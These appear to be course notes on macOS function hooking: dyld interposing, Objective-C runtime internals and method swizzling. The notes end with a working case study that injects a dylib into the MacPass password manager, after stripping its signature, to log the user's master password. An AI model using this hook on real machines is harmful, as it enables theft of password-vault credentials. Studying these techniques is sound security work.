# Module 6: Function Hooking on macOS

## Function Interposing

Interposing is a dyld-level technique to hook C function calls. Requires a dylib with `__DATA,__interpose` section containing tuples of `{replacement, replacee}` function pointers, injected via `DYLD_INSERT_LIBRARIES`.

**Limitation**: Does not work on "restricted" applications (hardened runtime, SIP-protected).

### DYLD_INTERPOSE Macro

From `dyld-832.7.1/include/mach-o/dyld-interposing.h`:

```c
#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; \
        const void* replacee; \
    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
        (const void*) (unsigned long) &_replacement, \
        (const void*) (unsigned long) &_replacee \
    };
```

### printf Hooking Example

```c
#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; const void* replacee; \
    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
        (const void*)(unsigned long)&_replacement, \
        (const void*)(unsigned long)&_replacee };

int offsec_printf(const char *format, ...) {
    int ret = printf("[+] No more hello world\n");
    return ret;
}
DYLD_INTERPOSE(offsec_printf, printf);
```

```bash
gcc -dynamiclib interpose.c -o interpose.dylib
size -x -m -l interpose.dylib   # verify __interpose section in __DATA segment
DYLD_INSERT_LIBRARIES=interpose.dylib ./hello
# Output: [+] No more hello world
```

### ioctl Hooking and Stack Overflow Pitfall

Hooking `ioctl` with a printf inside causes infinite recursion:
`offsec_ioctl -> printf -> isatty -> ioctl -> offsec_ioctl -> ...` (hits stack guard, SIGSEGV)

**Root cause**: `isatty()` calls `ioctl(fildes, 0x4004667a)` internally.

**Fix**: Filter out the problematic request code:

```c
int offsec_ioctl(int d, unsigned long request, void *data) {
    if (request != 0x4004667a) {
        printf("[+] IOCTL fd: 0x%x, request: 0x%lx\n", d, request);
    }
    return (ioctl(d, request, data));
}
DYLD_INTERPOSE(offsec_ioctl, ioctl);
```

**Key takeaway**: Interposed functions may be called transitively by the hook itself. Always check for recursive call chains.

## Objective-C Method Swizzling

### The ObjC Runtime

- ObjC is **dynamic**: object types and method lookup happen at runtime
- Method names are preserved in binaries (great for reverse engineering)
- Every method call is translated to `objc_msgSend(object, selector, args...)`

### Key Structures

```
objc_object -> isa -> objc_class -> methodLists -> objc_method
                                                    |- method_name (SEL - C string pointer)
                                                    |- method_types (encoded type string)
                                                    |- method_imp (IMP - function pointer)
```

- **`id`**: pointer to `objc_object` (contains `isa` pointer to class)
- **`SEL`**: pointer to method name string (selector)
- **`IMP`**: pointer to actual function implementation
- **`Class`**: pointer to `objc_class` (contains super_class, methodLists, cache, etc.)

### objc_msgSend Flow

1. Use `isa` pointer to get class
2. Search `methodLists` for matching selector
3. If found, call via `IMP` pointer; if not, check `super_class`
4. Cache speeds up subsequent lookups via `objc_cache`

### Runtime API Functions

```objc
// Get Class object
Class cls = [obj class];
Class cls = objc_getClass("NSString");  // by name

// Class info
const char *name = class_getName(cls);
Class super = class_getSuperclass(cls);

// Get Method
Method m = class_getInstanceMethod(cls, @selector(isEqual:));
unsigned argc = method_getNumberOfArguments(m);  // includes implicit self + _cmd
IMP imp = method_getImplementation(m);

// class-dump for discovering methods
class-dump /path/to/binary
```

### Three Ways to Call ObjC Methods from C

```objc
// 1. performSelector
NSUInteger num = (NSUInteger)[str performSelector:@selector(length)];

// 2. objc_msgSend (must typecast)
NSUInteger i = ((NSUInteger (*)(id, SEL))objc_msgSend)(str, @selector(length));

// 3. Direct IMP call
IMP imp = method_getImplementation(class_getInstanceMethod(cls, @selector(length)));
NSUInteger (*callImp)(id, SEL) = (typeof(callImp))imp;
NSUInteger j = callImp(str, @selector(length));
```

### Swizzling Technique 1: method_exchangeImplementations

Create a category with new method, then swap:

```objc
@interface NSString (NewNSString)
- (BOOL)custom_isEqualToString:(NSString *)aString;
@end

@implementation NSString (NewNSString)
- (BOOL)custom_isEqualToString:(NSString *)aString {
    NSLog(@"Hooked! _cmd is: %@", NSStringFromSelector(_cmd));
    return [self custom_isEqualToString:aString];  // calls ORIGINAL after swap
}
@end

// Perform the swap
Class cls = NSClassFromString(@"__NSCFString");
Method real = class_getInstanceMethod(cls, @selector(isEqualToString:));
Method fake = class_getInstanceMethod(cls, @selector(custom_isEqualToString:));
method_exchangeImplementations(real, fake);
```

**Limitation**: After swap, `_cmd` contains the swapped selector name. If original checks selector name, it will see the wrong one.

### Swizzling Technique 2: method_setImplementation (Preferred)

Replace IMP pointer directly with a C function:

```objc
static IMP real_isEqualToString = NULL;

static BOOL custom_isEqualToString(id self, SEL _cmd, NSString* aString) {
    NSLog(@"Hooked! _cmd is: %@", NSStringFromSelector(_cmd));
    return ((BOOL (*)(id, SEL, NSString*))real_isEqualToString)(self, _cmd, aString);
}

// Perform the swap
Class cls = NSClassFromString(@"__NSCFString");
Method m = class_getInstanceMethod(cls, @selector(isEqualToString:));
IMP fake = (IMP)custom_isEqualToString;
real_isEqualToString = method_setImplementation(m, fake);
```

**Advantage**: `_cmd` keeps its original value; no selector name mismatch.

## KeePass Master Password Sniffing Case Study

**Target**: MacPass (KeePass client) - hook `unlockWithPassword:keyFileURL:error:` in `MPDocument` class.

### Finding the Target Method

```bash
class-dump /Applications/MacPass.app/Contents/MacOS/MacPass
# Found: - (BOOL)unlockWithPassword:(id)arg1 keyFileURL:(id)arg2 error:(id *)arg3;
```

### Hook Implementation

```objc
static IMP real_unlockWithPassword = NULL;

static BOOL custom_unlockWithPassword(id self, SEL _cmd, NSString* password,
    NSURL* keyFileURL, NSError* error) {
    NSLog(@"password is: %@", password);
    return ((BOOL (*)(id,SEL,NSString*,NSURL*,NSError*))real_unlockWithPassword)(
        self, _cmd, password, keyFileURL, error);
}

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    Class cls = NSClassFromString(@"MPDocument");
    Method m = class_getInstanceMethod(cls,
        @selector(unlockWithPassword:keyFileURL:error:));
    real_unlockWithPassword = method_setImplementation(m, (IMP)custom_unlockWithPassword);
}
```

### Deployment

```bash
gcc -dynamiclib -framework Foundation mpsniff.m -o mpsniff.dylib
codesign --remove-signature /Applications/MacPass.app/Contents/MacOS/MacPass
cp mpsniff.dylib /Applications/MacPass.app/Contents/

# Add to Info.plist:
# <key>LSEnvironment</key><dict>
#   <key>DYLD_INSERT_LIBRARIES</key>
#   <string>/Applications/MacPass.app/Contents/mpsniff.dylib</string>
# </dict>

# Re-register app
/System/Library/Frameworks/CoreServices.framework/.../lsregister -f /Applications/MacPass.app

# Monitor for password
log stream --style syslog --predicate 'eventMessage CONTAINS[c] "password"'
```

Result: master password appears in log when user unlocks their vault.
